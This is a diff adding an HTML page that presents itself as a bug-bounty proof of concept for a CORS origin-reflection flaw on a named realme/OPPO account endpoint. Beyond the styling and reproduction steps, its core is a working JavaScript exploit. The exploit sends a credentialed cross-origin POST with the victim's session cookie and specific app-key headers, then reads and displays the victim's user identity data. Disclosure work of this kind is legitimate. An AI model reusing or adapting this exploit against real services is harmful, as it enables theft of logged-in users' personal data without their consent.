@@ -1,0 +1,353 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>CORS PoC — id-sg.realme.com</title>
+    <style>
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+      body {
+        font-family: "Courier New", monospace;
+        background: #0d1117;
+        color: #c9d1d9;
+        min-height: 100vh;
+        padding: 32px;
+      }
+      .container {
+        max-width: 860px;
+        margin: 0 auto;
+      }
+
+      .badge {
+        display: inline-block;
+        background: #da3633;
+        color: #fff;
+        font-size: 11px;
+        font-weight: bold;
+        letter-spacing: 1px;
+        padding: 3px 10px;
+        border-radius: 4px;
+        margin-bottom: 12px;
+      }
+      h1 {
+        font-size: 22px;
+        font-weight: bold;
+        color: #f0f6fc;
+        margin-bottom: 6px;
+      }
+      .meta {
+        font-size: 12px;
+        color: #8b949e;
+        margin-bottom: 28px;
+        line-height: 1.8;
+      }
+      .meta span {
+        color: #58a6ff;
+      }
+
+      .card {
+        background: #161b22;
+        border: 1px solid #30363d;
+        border-radius: 8px;
+        padding: 20px 24px;
+        margin-bottom: 20px;
+      }
+      .card-title {
+        font-size: 12px;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        color: #8b949e;
+        margin-bottom: 12px;
+      }
+      .info-row {
+        display: flex;
+        gap: 8px;
+        align-items: flex-start;
+        font-size: 13px;
+        margin-bottom: 8px;
+      }
+      .info-key {
+        color: #8b949e;
+        min-width: 80px;
+        flex-shrink: 0;
+      }
+      .info-val {
+        color: #79c0ff;
+        word-break: break-all;
+      }
+      .info-val.green {
+        color: #56d364;
+      }
+
+      button {
+        background: #238636;
+        color: #fff;
+        border: none;
+        padding: 10px 24px;
+        border-radius: 6px;
+        font-family: inherit;
+        font-size: 13px;
+        font-weight: bold;
+        cursor: pointer;
+        transition: background 0.15s;
+      }
+      button:hover {
+        background: #2ea043;
+      }
+      button:disabled {
+        background: #30363d;
+        color: #8b949e;
+        cursor: not-allowed;
+      }
+
+      #status {
+        font-size: 12px;
+        margin-top: 10px;
+        min-height: 18px;
+        color: #8b949e;
+      }
+      #status.ok {
+        color: #56d364;
+      }
+      #status.err {
+        color: #da3633;
+      }
+      #status.loading {
+        color: #e3b341;
+      }
+
+      pre {
+        background: #0d1117;
+        border: 1px solid #30363d;
+        border-radius: 6px;
+        padding: 16px;
+        font-size: 12px;
+        line-height: 1.6;
+        overflow-x: auto;
+        white-space: pre-wrap;
+        word-break: break-all;
+        color: #c9d1d9;
+        min-height: 60px;
+      }
+      .highlight {
+        color: #f8c555;
+      }
+
+      .steps {
+        font-size: 12px;
+        color: #8b949e;
+        line-height: 2;
+        counter-reset: step;
+      }
+      .steps li {
+        counter-increment: step;
+        list-style: none;
+        padding-left: 4px;
+      }
+      .steps li::before {
+        content: counter(step) ". ";
+        color: #58a6ff;
+      }
+
+      .cors-proof {
+        display: flex;
+        gap: 12px;
+        margin-top: 12px;
+        flex-wrap: wrap;
+      }
+      .pill {
+        font-size: 11px;
+        padding: 4px 10px;
+        border-radius: 20px;
+        border: 1px solid;
+      }
+      .pill.green {
+        border-color: #56d364;
+        color: #56d364;
+      }
+      .pill.red {
+        border-color: #da3633;
+        color: #f85149;
+      }
+      .pill.blue {
+        border-color: #58a6ff;
+        color: #79c0ff;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="badge">CORS MISCONFIGURATION — BUG BOUNTY POC</div>
+      <h1>Cross-Origin Data Leak — id-sg.realme.com</h1>
+      <div class="meta">
+        Target&nbsp;&nbsp;&nbsp;
+        <span>https://id-sg.realme.com/uc/web/v1/user-info/query-basic</span
+        ><br />
+        Origin&nbsp;&nbsp;&nbsp;&nbsp;
+        <span>https://ikur007.github.io</span> (attacker-controlled)<br />
+        Program&nbsp;&nbsp; <span>OPPO Bug Bounty — HackerOne / Bugcrowd</span>
+      </div>
+
+      <!-- Attack Info -->
+      <div class="card">
+        <div class="card-title">Vulnerability Details</div>
+        <div class="info-row">
+          <span class="info-key">Type</span>
+          <span class="info-val"
+            >CORS Misconfiguration — Arbitrary Origin Reflection</span
+          >
+        </div>
+        <div class="info-row">
+          <span class="info-key">Impact</span>
+          <span class="info-val"
+            >Authenticated cross-origin read of user identity data</span
+          >
+        </div>
+        <div class="info-row">
+          <span class="info-key">Root Cause</span>
+          <span class="info-val green">
+            Server reflects any Origin in Access-Control-Allow-Origin<br />
+            AND sets Access-Control-Allow-Credentials: true
+          </span>
+        </div>
+        <div class="cors-proof">
+          <div class="pill green">Allow-Credentials: true</div>
+          <div class="pill red">Origin Reflection: arbitrary</div>
+          <div class="pill blue">Method: POST</div>
+          <div class="pill blue">HTTP/2 200 OK</div>
+        </div>
+      </div>
+
+      <!-- Reproduce Steps -->
+      <div class="card">
+        <div class="card-title">Steps to Reproduce</div>
+        <ol class="steps">
+          <li>
+            Victim logs in to id.realme.com (session cookie
+            <code>acIdAuthSession</code> is set)
+          </li>
+          <li>
+            Victim visits attacker's page (this PoC hosted on ikur007.github.io)
+          </li>
+          <li>
+            This page fires a cross-origin POST to the user-info endpoint with
+            <code>credentials: 'include'</code>
+          </li>
+          <li>
+            Browser sends victim's session cookie automatically — server
+            reflects attacker's Origin
+          </li>
+          <li>
+            Attacker's JS reads the response and exfiltrates victim's user data
+          </li>
+        </ol>
+      </div>
+
+      <!-- Live PoC -->
+      <div class="card">
+        <div class="card-title">Live Exploit</div>
+        <div style="margin-bottom: 12px; font-size: 12px; color: #8b949e">
+          Pastikan kamu sudah login di
+          <span style="color: #58a6ff">id.realme.com</span> di browser yang sama
+          sebelum klik tombol di bawah.
+        </div>
+        <button id="btnExploit" onclick="runExploit()">
+          ▶ Run PoC — Steal User Data
+        </button>
+        <div id="status"></div>
+      </div>
+
+      <!-- Response Headers -->
+      <div class="card">
+        <div class="card-title">Captured Response Headers</div>
+        <pre id="outputHeaders">— belum dijalankan —</pre>
+      </div>
+
+      <!-- Response Body -->
+      <div class="card">
+        <div class="card-title">Leaked Response Body (User Data)</div>
+        <pre id="outputBody">— belum dijalankan —</pre>
+      </div>
+    </div>
+
+    <script>
+      async function runExploit() {
+        const btn = document.getElementById("btnExploit");
+        const status = document.getElementById("status");
+        const headersEl = document.getElementById("outputHeaders");
+        const bodyEl = document.getElementById("outputBody");
+
+        btn.disabled = true;
+        status.className = "loading";
+        status.textContent = "⏳ Firing cross-origin request...";
+        headersEl.textContent = "...";
+        bodyEl.textContent = "...";
+
+        const TARGET =
+          "https://id-sg.realme.com/uc/web/v1/user-info/query-basic";
+
+        try {
+          const resp = await fetch(TARGET, {
+            method: "POST",
+            credentials: "include", // <-- sends victim's cookies cross-origin
+            headers: {
+              "Content-Type": "application/json;charset=UTF-8",
+              Accept: "application/json, text/plain, */*",
+              "Accept-Language": "en-US",
+              "X-Biz-Appkey": "TZeSXfQXxrCyjhvARAVrmw",
+              "X-App-Fromht": "false",
+              "X-Envelope-Version": "V1",
+              "X-Device-Brand": "REALME",
+              "X-App-Overseaclient": "true",
+              "X-App-Acappkey": "CuGsbe6HdAe6vDBHFew2Di",
+              "X-Device-Clienttype": "WEB",
+            },
+            body: JSON.stringify({}),
+          });
+
+          // Collect response headers
+          const corsOrigin = resp.headers.get("Access-Control-Allow-Origin");
+          const corsCreds = resp.headers.get(
+            "Access-Control-Allow-Credentials",
+          );
+          const corsAllow = resp.headers.get("Access-Control-Allow-Methods");
+          const contentType = resp.headers.get("Content-Type");
+          const backendHost = resp.headers.get("X-Backend-Host");
+
+          headersEl.innerHTML =
+            `<span class="highlight">Access-Control-Allow-Origin</span>      : ${corsOrigin}\n` +
+            `<span class="highlight">Access-Control-Allow-Credentials</span>  : ${corsCreds}\n` +
+            `<span class="highlight">Access-Control-Allow-Methods</span>      : ${corsAllow}\n` +
+            `Content-Type                          : ${contentType}\n` +
+            `X-Backend-Host                        : ${backendHost}`;
+
+          // Read body
+          const rawBody = await resp.text();
+          bodyEl.textContent = rawBody || "(empty body)";
+
+          // Check actual CORS bypass
+          const currentOrigin = window.location.origin;
+          if (corsOrigin === currentOrigin && corsCreds === "true") {
+            status.className = "ok";
+            status.textContent = `✅ CORS bypass confirmed! Server reflected origin: ${currentOrigin} — credentials accepted. HTTP ${resp.status}`;
+          } else {
+            status.className = "err";
+            status.textContent = `⚠️ Origin tidak direfleksikan. ACAO: ${corsOrigin}`;
+          }
+        } catch (err) {
+          status.className = "err";
+          status.textContent =
+            "❌ Request gagal (mungkin tidak ada session aktif, atau endpoint butuh body terenkripsi): " +
+            err.message;
+          headersEl.textContent = err.toString();
+          bodyEl.textContent = "—";
+        } finally {
+          btn.disabled = false;
+        }
+      }
+    </script>
+  </body>
+</html>
